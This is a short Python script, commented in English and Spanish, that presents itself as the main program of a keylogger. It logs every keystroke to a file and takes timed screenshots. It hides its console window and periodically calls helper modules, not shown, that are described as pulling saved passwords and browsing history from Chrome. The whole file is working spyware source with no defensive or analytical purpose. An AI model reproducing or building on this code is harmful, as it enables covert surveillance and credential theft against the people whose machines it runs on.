#THIS IS THE MAIN SCRIPT THAT GENERATES THE KEYLOGGER, TAKES SCREEN SHOTS RETRIEVES THE PASSWORDS AND HISTORY FROM CHROME 
#THE tomascreen FUNCTION IS THE TIMER THAT CALLS THE OTHER FUNCTIONS. 

#ESTE ES EL CODIGO PRINCIPAL QUE GENERA EL KEYLOGGER, TOMA LAS CAPTURAS DE PANTALLA, RECUPERA LAS CONTRASEÑAS Y EL HISTORIAL DE CHROME
#LA FUNCION tomascreen ES LA ENCARGADA DE MANDAR LLAMAR LAS OTRAS FUNCIONES EN BASE AL TIEMPO INGRESADO


from pynput.keyboard import Key, Listener
import logging
import pyautogui
import win32console 
import win32gui 


#librerias para el timer de screenshot 
import time, threading



#se importa la funcion del historial y contraseñas
import history 
import passwords 


##screenshots
minutos = int(input(" Ingresa los minutos en que se tomaran las capturas, se actualizara el historial y las contraseñas "))

#funcion que llama las funciones cada x segundos
WAIT_SECONDS = minutos * 60  
def tomascreen():
	pic = pyautogui.screenshot()
	hora=time.ctime()
	  
	pic.save("screenshots.png")
	threading.Timer(WAIT_SECONDS,tomascreen).start()
	#se actualiza el historial y las contraseñas de chrome cada x segundos
	history.historialdechrome()
	passwords.contrachrome()
	win = win32console.GetConsoleWindow()
	win32gui.ShowWindow(win,0)

tomascreen()
##screenshots


##keylogger 
log = "K-lo.txt"
logging.basicConfig(filename=log, level=logging.DEBUG, format='%(asctime)s: %(message)s') 

def on_press(key):
	logging.info(str(key))

with Listener(on_press=on_press) as listener:
	listener.join()
##keylogger 




